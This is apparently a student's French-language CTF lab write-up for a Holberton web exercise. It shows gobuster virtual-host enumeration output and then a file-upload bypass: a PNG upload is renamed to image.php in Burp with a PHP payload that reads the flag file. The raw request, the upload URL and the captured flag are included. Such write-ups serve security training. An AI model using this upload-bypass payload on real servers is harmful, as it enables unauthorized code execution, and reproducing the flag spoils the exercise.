@@ -1,0 +1,71 @@
+Task0:
+
+┌──(kali㉿kali)-[~/Holberton]
+└─$ gobuster vhost -u http://web0x05.hbtn -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -t 800 --append-domain
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://web0x05.hbtn
+[+] Method:          GET
+[+] Threads:         800
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: xn--rvarspaket.web0x05.hbtn Status: 500 [Size: 265]
+Found: xn--mattenstrae6-u9a.web0x05.hbtn Status: 500 [Size: 265]
+Found: test-s3.web0x05.hbtn Status: 200 [Size: 478]
+Progress: 708344 / 3000001 (23.61%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 708482 / 3000001 (23.62%)
+===============================================================
+Finished
+===============================================================
+
+Task1:
+Uploader une image.png et intercepter dans burp:
+Renommer le fichier image.png en image.php puis modifier le contenu avec la ligne php puis send.
+
+POST /api/task1/ HTTP/1.1
+
+Host: test-s3.web0x05.hbtn
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://test-s3.web0x05.hbtn/task1
+
+Content-Type: multipart/form-data; boundary=---------------------------216237153329695653804163589669
+
+Content-Length: 114997
+
+Origin: http://test-s3.web0x05.hbtn
+
+Connection: close
+
+
+
+-----------------------------216237153329695653804163589669
+
+Content-Disposition: form-data; name="file"; filename="image.php"
+
+Content-Type: image/png
+
+<?php readfile('FLAG_1.txt') ?>
+
+-----------------------------216237153329695653804163589669--
+
+On peut voir sur le site que image.php a bien été téléchargée.
+Au bout de la ligne -> copy link:
+
+http://test-s3.web0x05.hbtn/static/upload/image.php
+36aac3b2c46dc71ff020b4f5a085a966
